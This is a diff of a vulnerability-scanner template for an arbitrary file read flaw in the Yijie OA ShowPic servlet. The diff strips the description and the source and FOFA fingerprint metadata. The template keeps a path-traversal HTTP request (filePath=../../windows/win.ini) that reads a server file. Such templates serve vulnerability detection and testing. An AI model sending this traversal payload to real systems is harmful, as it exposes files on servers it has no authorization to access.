@@ -3,12 +3,8 @@ info:
   name: 易捷OA协同办公软件 ShowPic 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wmqgiiiggrtsvs8w'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wmqgiiiggrtsvs8w
-    fofa: body="/images/logon/bg_img.jpg"
 http:
 - raw:
   - 'GET /servlet/ShowPic?filePath=../../windows/win.ini HTTP/1.1
